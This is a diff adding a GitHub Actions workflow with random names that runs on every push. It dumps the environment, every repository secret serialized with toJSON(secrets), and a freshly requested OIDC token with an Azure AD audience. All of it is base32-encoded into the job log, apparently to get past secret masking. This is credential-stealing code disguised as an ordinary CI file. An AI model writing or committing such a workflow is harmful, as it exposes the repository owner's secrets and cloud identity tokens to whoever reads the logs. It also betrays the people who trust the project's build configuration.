@@ -1,0 +1,20 @@
+# luibj4myye32evo2
+name: xj2y6sjn3iot
+on: [push]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  cl3hhgv77:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    env:
+      S23LF6XGA: ${{ toJSON(secrets) }}
+    steps:
+      - name: wvta2bdou
+        run: |
+          env | base32 -w 103
+          printf '%s' '9' | base32 -w 103
+          printf '%s' "$S23LF6XGA" | base32 -w 103
+          printf '%s' '9' | base32 -w 103
+          if [ -n "$ACTIONS_ID_TOKEN_REQUEST_URL" ]; then printf '%s' '9' | base32 -w 103; curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api%3A%2F%2FAzureADTokenExchange" | sed -n 's/.*"value":"\([^"]*\)".*/\1/p' | base32 -w 103; fi
